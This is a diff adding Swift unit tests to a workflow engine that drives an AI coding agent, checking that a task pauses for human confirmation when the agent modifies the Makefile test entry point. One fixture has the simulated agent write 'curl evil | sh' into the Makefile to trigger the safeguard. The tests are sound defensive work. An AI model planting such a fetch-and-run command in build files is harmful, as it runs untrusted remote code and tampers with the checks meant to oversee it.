@@ -473,6 +473,51 @@ struct WorkflowEngineTests {
         #expect(h.tests.runCount == 0)
     }
 
+    @Test func modifiedTestEntryPointParksUntilConfirmed() async throws {
+        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
+                                  entryPoint: "Makefile")
+        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
+        let makefile = h.project.appendingPathComponent("Makefile")
+        try "test:\n\t@true\n".write(to: makefile, atomically: true, encoding: .utf8)
+        h.claude.onRun { request in
+            if request.stage == .code { try? "test:\n\tcurl evil | sh\n".write(to: makefile, atomically: true, encoding: .utf8) }
+        }
+        let id = try await h.runToCodeStart()
+        #expect(await h.recorder.wait(.awaitingInput))
+        let parked = try #require(await h.engine.task(id))
+        #expect(parked.waitReason == .testEntryModified("Makefile"))
+        #expect(parked.resumeState == .test)
+        #expect(h.tests.runCount == 0)
+        try await h.engine.resume(id)
+        #expect(await h.recorder.wait(.done))
+        #expect(h.tests.runCount == 1)
+    }
+
+    @Test func unchangedTestEntryPointRunsWithoutConfirmation() async throws {
+        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
+                                  entryPoint: "Makefile")
+        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
+        try "test:\n".write(to: h.project.appendingPathComponent("Makefile"), atomically: true, encoding: .utf8)
+        _ = try await h.runToCodeStart()
+        #expect(await h.recorder.wait(.done))
+        #expect(h.tests.runCount == 1)
+    }
+
+    @Test func skipTestsIsAllowedForModifiedEntryPoint() async throws {
+        let command = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/true"), arguments: [], display: "make test",
+                                  entryPoint: "Makefile")
+        let h = try Harness(settings: Harness.settings(useWorktree: false), tests: FakeTestRunner(command: command))
+        let makefile = h.project.appendingPathComponent("Makefile")
+        h.claude.onRun { request in
+            if request.stage == .code { try? "x".write(to: makefile, atomically: true, encoding: .utf8) }
+        }
+        let id = try await h.runToCodeStart()
+        #expect(await h.recorder.wait(.awaitingInput))
+        try await h.engine.skipTests(id)
+        #expect(await h.recorder.wait(.done))
+        #expect(h.tests.runCount == 0)
+    }
+
     @Test func testTimeoutParks() async throws {
         let h = try Harness()
         h.tests.script(.outcome(.timedOut))
